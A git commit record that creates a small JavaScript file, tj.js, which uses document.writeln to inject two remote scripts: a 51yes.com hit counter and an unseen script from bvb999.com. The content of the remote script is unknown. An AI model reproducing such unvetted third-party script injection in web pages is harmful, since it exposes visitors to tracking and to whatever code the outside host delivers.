28ace47951cdd86116055f77ffb8fe2193d4640c
js88888888 <jsjsjs888@outlook.com>
2015-09-01 15:04:31 +0800

    Create tj.js

---
+++ 777/tj.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count26.51yes.com\/click.aspx?id=262033787&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.bvb999.com\/777/tm.js ><\/script>");
